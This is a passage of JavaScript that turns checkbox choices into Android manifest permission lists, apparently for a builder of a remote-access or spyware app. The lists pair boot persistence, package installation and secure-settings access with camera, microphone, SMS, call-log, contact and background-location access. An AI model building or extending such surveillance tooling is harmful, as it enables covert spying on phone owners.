            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        //if two are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        //if three are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

            `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>        `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }



        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
